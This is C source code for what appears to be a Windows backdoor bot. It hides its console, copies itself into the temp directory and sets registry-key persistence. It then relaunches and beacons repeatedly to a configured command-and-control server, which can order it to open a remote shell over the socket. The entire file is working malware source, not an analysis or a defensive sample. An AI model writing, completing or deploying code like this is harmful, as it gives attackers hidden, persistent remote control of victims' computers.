#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "main.h"
#include "modules.h"

static void copy(char *src_path, char *dst_path);
static void beacon();
static int recv_cmd(SOCKET c2_sock);

/* 
** copy self to temp directory >> 
** add regkey persistance >> 
** execute new path (in temp) >> 
** beacon c2 
*/
int main(int argc, char* argv[])
{
  char curr_path[MAX_PATH];
  char temp_path[MAX_PATH];
  char target_path[MAX_PATH + FILENAME_MAX + 1]= {0};
  int exists;
  HMODULE handle;

  FreeConsole();
	
  /* get the current path to the executable */
  handle= GetModuleHandleA(NULL);
  GetModuleFileNameA(handle, (char *)curr_path, MAX_PATH);

  /* find the windows temp path and append the file name */
  GetTempPath(MAX_PATH, temp_path);
  strcat(target_path, temp_path);
  strcat(target_path, strrchr(curr_path, '\\') + 1);
  
  /* check if the bot already exists in the temp directory */
  exists= (strcmp(target_path, curr_path) == 0);

  if (!exists) /* copy to temp path and execute*/
    {
      copy(curr_path, target_path);
      regkey_persist(target_path);
      ShellExecute(NULL, "open", target_path, NULL, 0, 0);
    }
  else { /* beacon c2 if bot exists in temp folder */
      beacon();
    }
  
  return 0;
}

/* continually beacon the C2 until a connection is made */
static void beacon()
{
  SOCKET sock;
  struct sockaddr_in server;
  WSADATA wsa;

  while (1)
  {
    Sleep(5000);
    
      /* initialize win sock version*/
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	    exit(0);
      
    if ((sock= WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
		  NULL, (unsigned int)NULL, (unsigned int)NULL)) != INVALID_SOCKET)
	  {
	    server.sin_addr.s_addr= inet_addr(C2SERVER);
	    server.sin_family= AF_INET;
	    server.sin_port= htons(C2PORT);
	  
	    if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
	        != SOCKET_ERROR)
	      while (recv_cmd(sock)); /* continue recieving commands while connection is alive */
	  }

      WSACleanup();
      closesocket(sock);
  }
}

/* receive a module code from the c2 server and parse instructions.
   then send success or error code. */
static int recv_cmd(SOCKET c2_sock)
{
  char recv_buff[16]= {0};
  char reply_buff[16]= {0};
  int module_code;
  int is_alive= 0;
  
  /* get module code from c2 */
  if (recv(c2_sock, recv_buff, 16, 0) > 0)
  {
    /* recieved data from sock - connection is alive */
    is_alive= 1;
      
    /* get module code from sock stream */
    sscanf(recv_buff, "%d", &module_code);
      
    if (module_code == SPAWN_SHELL)
	    sprintf(reply_buff, "%d", spawn_shell((HANDLE)c2_sock));
    else if (module_code == DISCONNECT)
	    is_alive= 0;
    else
	    sprintf(reply_buff, "%d", NOT_FOUND);

    send(c2_sock, reply_buff, 16, 0);
  }
     
  return is_alive;
}

/* open a src file and copy it to the dst path */
static void copy(char *src_path, char *dst_path)
{
  FILE *src_file, *dst_file;
  unsigned char buff[8192];
  size_t bytes;

  src_file= fopen(src_path, "rb");
  dst_file= fopen(dst_path, "wb");
    
  while ((bytes= fread(buff, 1, sizeof(buff), src_file)) > 0)
      fwrite(buff, 1, bytes, dst_file);
    
  fclose(src_file);
  fclose(dst_file);
}



